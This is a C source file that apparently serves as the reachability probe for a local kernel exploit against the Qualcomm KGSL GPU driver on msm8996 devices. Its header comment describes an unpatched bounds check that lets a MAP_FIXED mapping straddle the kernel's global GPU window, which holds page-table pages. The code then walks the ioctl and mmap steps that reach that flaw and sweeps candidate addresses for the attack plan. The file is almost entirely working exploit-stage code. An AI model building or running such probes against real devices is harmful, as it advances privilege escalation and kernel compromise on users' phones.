/*
 * kgsl_gate - prerequisite probe for the "BadPage" shape on this device
 * (msm8996 / Adreno 530, /dev/kgsl-3d0 is 0666 and one of the few shell-writable nodes).
 *
 * The unpatched check this exploits (verified in this tree by audit):
 *   drivers/gpu/msm/kgsl.c:3544   if (flags & MAP_FIXED) return _gpu_set_svm_region(...)
 *   drivers/gpu/msm/kgsl_iommu.c:1871-1884  ADDR_IN_GLOBAL() tests only the two
 *   ENDPOINTS of the requested range, so a range that fully *contains* the 8 MB global
 *   window (0xf8000000..0xf8800000) passes; and kgsl_iommu_map_globals() installs the
 *   kernel's own objects (page-table pages, memstore, preemption records) with
 *   kgsl_mmu_map() but never _insert_gpuaddr(), so they are absent from the process rbtree
 *   that the overlap walk consults.
 *
 * This probe only *checks reachability*, it does not corrupt anything:
 *   1 open, 2 gpumem alloc, 3 drawctxt create, 4 submit one CP_NOP (GPU executes it),
 *   5 the straddling MAP_FIXED cpu_map.  Each step prints errno, which is the decision
 *   procedure we already used elsewhere on this box (ENOENT/EACCES = gate, ENOTTY = no
 *   handler, 0 = reached).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include "msm_kgsl.h"

#define OFF(id)  ((off_t)(id) << 12)	/* kgsl id-mmap: vm_pgoff = id */
#define GLOBAL_BASE 0xf8000000ULL
#define GLOBAL_SZ   0x00800000ULL

static int fd;

static void step(const char *name, int rc, int err)
{
	printf("%-28s rc=%d errno=%d (%s)\n", name, rc, err, err ? strerror(err) : "ok");
}

int main(int argc, char **argv)
{
	struct kgsl_gpumem_alloc_id aid;
	struct kgsl_drawctxt_create dctx;
	struct kgsl_gpu_command cmd;
	struct kgsl_command_object objs[1];
	unsigned int ib[8];
	void *p;
	int rc;
	size_t sz = (argc > 1) ? strtoull(argv[1], NULL, 0) : 0x900000;
	unsigned long ib_gpu = 0;	/* 9 MB */
	unsigned long long hint = (argc > 2) ? strtoull(argv[2], NULL, 0)
						: (GLOBAL_BASE - 0x100000);	/* straddle */

	fd = open("/dev/kgsl-3d0", O_RDWR);
	if (fd < 0) {
		printf("open /dev/kgsl-3d0: %s\n", strerror(errno));
		return 1;
	}
	printf("open ok fd=%d\n", fd);

	memset(&aid, 0, sizeof aid);
	aid.flags = 0;		/* let the driver pick a GPU VA we can point an IB at */
	aid.size = 0x1000;
	errno = 0;
	rc = ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &aid);
	step("gpumem_alloc_id(4K)", rc, errno);
	if (rc == 0)
		ib_gpu = (unsigned long)aid.gpuaddr;
	printf("   id=%u gpuaddr=%#lx mmapsize=%#zx\n", aid.id,
		       (unsigned long)aid.gpuaddr, (size_t)aid.mmapsize);

	memset(&aid, 0, sizeof aid);
	aid.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	aid.size = sz;
	errno = 0;
	rc = ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &aid);
	step("gpumem_alloc_id(big)", rc, errno);
	if (rc)
		return 2;
	printf("   id=%u size=%#zx mmapsize=%#zx gpuaddr=%#lx\n", aid.id, sz,
	       (size_t)aid.mmapsize, (unsigned long)aid.gpuaddr);

	memset(&dctx, 0, sizeof dctx);
	dctx.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC;
	errno = 0;
	rc = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dctx);
	step("drawctxt_create", rc, errno);
	if (rc)
		return 3;
	printf("   drawctxt_id=%u\n", dctx.drawctxt_id);

	/* one IB1 holding CP_NOP (0x00000000) then CP_END (0x00002000) */
	memset(ib, 0, sizeof ib);
	ib[0] = 0x00000000;		/* CP_NOP */
	ib[1] = 0x00002000;		/* CP_EVENT_WRITE / CP_END marker */

	memset(objs, 0, sizeof objs);
	objs[0].gpuaddr = ib_gpu;
	objs[0].size = sizeof ib;
	objs[0].flags = KGSL_CMDLIST_IB;

	memset(&cmd, 0, sizeof cmd);
	cmd.flags = 0;
	cmd.cmdlist = (uint64_t)(unsigned long)objs;
	cmd.cmdsize = sizeof objs[0];
	cmd.numcmds = 1;
	cmd.context_id = dctx.drawctxt_id;
	cmd.timestamp = 0;
	errno = 0;
	rc = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
	step("gpu_command(CP_NOP)", rc, errno);
	if (rc == 0)
		printf("   timestamp=%u\n", cmd.timestamp);

	/* baseline first: does the id-offset mmap work at all, and with which flags? */
	{
		struct kgsl_gpumem_alloc_id a2;
		void *b;
		memset(&a2, 0, sizeof a2);
		a2.flags = 0;			/* driver picks the GPU VA */
		a2.size = 0x1000;
		errno = 0;
		rc = ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &a2);
		step("gpumem_alloc_id(flags=0)", rc, errno);
		printf("   id=%u gpuaddr=%#lx\n", a2.id, (unsigned long)a2.gpuaddr);
		b = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, OFF(a2.id));
		printf("%-28s = %p errno=%d (%s)\n", "mmap base id-offset", b, errno,
		       errno ? strerror(errno) : "ok");
		(void)b;
	}
	/* hint sweep: which GPU/CPU hints does MAP_FIXED accept?  in-svm means the driver
	 * will honour the address; the ones near the global window decide Plan A.
	 */
	{
		struct { const char *nm; unsigned long long h; size_t sz; } cs[] = {
			{"fix 0x0be00000 (svm32 hi)", 0x0be00000, 0x2000},
			{"fix 0x0c000000 (>svm32 end)", 0x0c000000, 0x2000},
			{"fix 0xf7000000", 0xf7000000, 0x2000},
			{"fix 0xf7ff0000 straddle?", 0xf7ff0000, 0x2000},
			{"fix 0xf8001000 inside glob", 0xf8001000, 0x2000},
			{"fix 0xf7800000 9M straddle", 0xf7800000, 0x901000},
		};
		unsigned int k;
		for (k = 0; k < sizeof cs / sizeof cs[0]; k++) {
			void *q;
			errno = 0;
			q = mmap((void *)(unsigned long)cs[k].h, cs[k].sz,
				 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, OFF(aid.id));
			printf("%-30s = %-12p errno=%d (%s)\n", cs[k].nm, q, errno,
			       errno ? strerror(errno) : "ACCEPTED");
			if (q != MAP_FAILED)
				munmap(q, cs[k].sz);
		}
	}
	/* the decisive gate: MAP_FIXED at a hint whose range straddles the global window */
	p = mmap((void *)(unsigned long)hint, aid.mmapsize ? aid.mmapsize : sz,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, OFF(aid.id));
	if (p == MAP_FAILED) {
		printf("%-28s FAILED errno=%d (%s)\n", "mmap MAP_FIXED straddle", errno,
		       strerror(errno));
		return 4;
	}
	printf("%-28s = %p (hint=%#llx sz=%#zx) %s\n", "mmap MAP_FIXED straddle", p, hint,
	       aid.mmapsize, ((unsigned long long)p >= GLOBAL_BASE &&
			     (unsigned long long)p + sz <= GLOBAL_BASE + GLOBAL_SZ)
			? "INSIDE global window -- would be rejected"
			: "straddles/contains global window -- the unpatched case");
	(void)step;
	return 0;
}
